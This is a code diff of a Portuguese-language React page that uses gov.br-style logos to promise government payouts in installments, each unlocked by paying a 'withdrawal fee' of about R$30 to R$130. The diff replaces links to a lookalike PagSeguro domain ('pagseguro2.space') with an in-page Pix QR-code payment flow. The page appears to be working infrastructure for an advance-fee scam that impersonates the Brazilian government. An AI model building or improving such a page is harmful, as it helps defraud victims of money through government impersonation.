@@ -1,18 +1,102 @@
+import { useState } from "react";
 import i3 from "../../images/i3.png";
 import gov1 from '../../images/gov1.png';
 import gov2 from '../../images/gov2.png';
 import gov3 from "../../images/gov3.png";
 
+const v1 = 30.21;
+const v2 = 70.56;
+const v3 = 130.43;
 
-
-
-
+type PixResponse = {
+    transactionId?: string;
+    qrCodeBase64?: string;
+    qrCode?: string;
+    copyPaste?: string;
+    amount?: number;
+    error?: string;
+};
 
 function CheckMatePage() {
+    const sanitizeName = (s: string) => {
+        if (!s) return ''
+        // keep letters (including accents), spaces, hyphens and apostrophes
+        const cleaned = s.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ\s'-]/g, '')
+        return cleaned.trim().replace(/\s+/g, ' ')
+    }
+    const [pixAberto, setPixAberto] = useState(false);
+    const [pixCarregando, setPixCarregando] = useState(false);
+    const [pixErro, setPixErro] = useState("");
+    const [pixPlano, setPixPlano] = useState("");
+    const [pixValor, setPixValor] = useState(0);
+    const [pixQrUrl, setPixQrUrl] = useState("");
+    const [pixCopiaCola, setPixCopiaCola] = useState("");
 
-    const check29 = "https://checkout.pagseguro2.space/VCCL1O8SCQ97";
-    const check69 = "https://checkout.pagseguro2.space/VCCL1O8SCQES";
-    const check129 = "https://checkout.pagseguro2.space/VCCL1O8SCQET";
+    const abrirPixDireto = async (nome: string, valor: number) => {
+        setPixAberto(true);
+        setPixCarregando(true);
+        setPixErro("");
+        setPixPlano(nome);
+        setPixValor(valor);
+        setPixQrUrl("");
+        setPixCopiaCola("");
+
+        try {
+            const payload = {
+                name: sanitizeName(nome) || 'Cliente',
+                email: "cliente@pedemeia.app",
+                amount: valor,
+            }
+
+            console.log('[CheckMate] sending pix payload:', payload)
+
+            const response = await fetch("/api/pix/create", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(payload),
+            });
+
+            if (!response.ok) {
+                const text = await response.text()
+                let parsed: PixResponse | null = null
+                try {
+                    parsed = JSON.parse(text)
+                } catch (e) {
+                    // ignore
+                }
+                console.error('[CheckMate] pix create failed:', response.status, text)
+                throw new Error((parsed && (parsed.error as string)) || `Erro ao gerar PIX (status ${response.status})`)
+            }
+
+            const data = (await response.json()) as PixResponse;
+
+            if (!data.copyPaste || (!data.qrCodeBase64 && !data.qrCode)) {
+                throw new Error("Resposta invalida do gateway PIX.");
+            }
+
+            setPixCopiaCola(data.copyPaste);
+            setPixQrUrl(
+                data.qrCodeBase64
+                    ? data.qrCodeBase64.startsWith("data:")
+                        ? data.qrCodeBase64
+                        : `data:image/png;base64,${data.qrCodeBase64}`
+                    : data.qrCode || ""
+            );
+        } catch (error) {
+            setPixErro(error instanceof Error ? error.message : "Erro ao gerar PIX.");
+        } finally {
+            setPixCarregando(false);
+        }
+    };
+
+    const copiarPix = async () => {
+        if (!pixCopiaCola) return;
+        await navigator.clipboard.writeText(pixCopiaCola);
+    };
+
+
 
     return (
         <div className="flex flex-col min-h-screen">
@@ -72,30 +156,31 @@ function CheckMatePage() {
             <div className="flex flex-col justify-center items-center mt-3">
                 <h1>PARABÉNS! ESCOLHA UMA OPÇÃO ABAIXO: </h1>
 
-                <div  onClick={() => window.location.href = check29}
-                className="mt-6 p-6 bg-white rounded-lg shadow-[0_0_25px_rgba(0,0,0,0.55)] flex items-center w-[90%]">
+
+                <div onClick={() => abrirPixDireto('+ Vendido', v1)}
+                    className="mt-6 p-6 bg-white rounded-lg shadow-[0_0_25px_rgba(0,0,0,0.55)] flex items-center w-[90%]">
                     <img src={gov3} alt="gov.com.br" className="w-20 mr-15" />
                     <div>
                         <h2>Receber 36x de <span className="font-bold">R$255,55</span></h2>
-                        <p>Taxa para saque: <span className="font-bold">R$30,21</span></p>
+                        <p>Taxa para saque: <span className="font-bold">R${v1}</span></p>
                     </div>
                 </div>
 
-                <div onClick={() => window.location.href = check69}
-                className="mt-6 p-6 bg-white rounded-lg shadow-[0_0_25px_rgba(0,0,0,0.55)] flex items-center w-[90%]">
+                <div onClick={() => abrirPixDireto('Gov.br', v2)}
+                    className="mt-6 p-6 bg-white rounded-lg shadow-[0_0_25px_rgba(0,0,0,0.55)] flex items-center w-[90%]">
                     <img src={gov3} alt="gov.com.br" className="w-20 mr-15" />
                     <div>
                         <h2>Receber 12x de <span className="font-bold">R$766,66</span></h2>
-                        <p>Taxa para saque: <span className="font-bold">R$70,21</span></p>
+                        <p>Taxa para saque: <span className="font-bold">R${v2}</span></p>
                     </div>
                 </div>
 
-                <div onClick={() => window.location.href = check129}
-                className="mt-6 p-6 bg-white rounded-lg shadow-[0_0_25px_rgba(0,0,0,0.55)] flex items-center w-[90%]">
+                <div onClick={() => abrirPixDireto('Gov.br', v3)}
+                    className="mt-6 p-6 bg-white rounded-lg shadow-[0_0_25px_rgba(0,0,0,0.55)] flex items-center w-[90%]">
                     <img src={gov3} alt="gov.com.br" className="w-20 mr-15" />
                     <div>
                         <h2>Receber 1x de <span className="font-bold">R$9.200,00</span></h2>
-                        <p>Taxa para saque: <span className="font-bold">R$130,21</span></p>
+                        <p>Taxa para saque: <span className="font-bold">R${v3}</span></p>
                     </div>
                 </div>
 
@@ -105,10 +190,63 @@ function CheckMatePage() {
 
             </div>
 
-            <footer className="bg-[var(--azul-footer)] flex py-7 justify-center gap-20 mt-10">
-                <img src={gov1} alt="Gov1" className="w-30 object-contain" />
-                <img src={gov2} alt="Gov2" className="w-30 object-contain" />
+            <footer className="bg-[var(--azul-footer)] flex py-3 justify-center gap-20 mt-auto">
+                <img src={gov1} alt="Gov1" className="w-20 object-contain" />
+                <img src={gov2} alt="Gov2" className="w-20 object-contain" />
             </footer>
+
+            {pixAberto && (
+                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4">
+                    <div className="w-full max-w-md rounded-lg bg-white p-5 shadow-xl">
+                        <div className="flex items-center justify-between gap-4">
+                            <div>
+                                <h2 className="text-lg font-bold text-[var(--azul-escuro)]">Pagamento Pix</h2>
+                                <p className="text-sm text-gray-700">
+                                    {pixPlano} - R$ {pixValor.toFixed(2).replace(".", ",")}
+                                </p>
+                            </div>
+                            <button
+                                type="button"
+                                onClick={() => setPixAberto(false)}
+                                className="rounded-full px-3 py-1 text-xl leading-none text-gray-600 hover:bg-gray-100"
+                                aria-label="Fechar Pix"
+                            >
+                                x
+                            </button>
+                        </div>
+
+                        {pixCarregando && (
+                            <div className="mt-6 rounded-md bg-gray-100 p-4 text-center text-sm text-gray-700">
+                                Gerando Pix...
+                            </div>
+                        )}
+
+                        {pixErro && (
+                            <div className="mt-6 rounded-md bg-red-50 p-4 text-sm text-red-700">
+                                {pixErro}
+                            </div>
+                        )}
+
+                        {!pixCarregando && !pixErro && pixQrUrl && (
+                            <div className="mt-5 flex flex-col items-center gap-4">
+                                <img src={pixQrUrl} alt="QR Code Pix" className="h-56 w-56 rounded-md border object-contain p-2" />
+                                <textarea
+                                    value={pixCopiaCola}
+                                    readOnly
+                                    className="h-24 w-full resize-none rounded-md border border-gray-300 p-3 text-xs text-gray-700"
+                                />
+                                <button
+                                    type="button"
+                                    onClick={copiarPix}
+                                    className="w-full rounded-md bg-[var(--azul-escuro)] px-4 py-3 font-bold text-white hover:bg-blue-800"
+                                >
+                                    Copiar codigo Pix
+                                </button>
+                            </div>
+                        )}
+                    </div>
+                </div>
+            )}
 
         </div>
     );
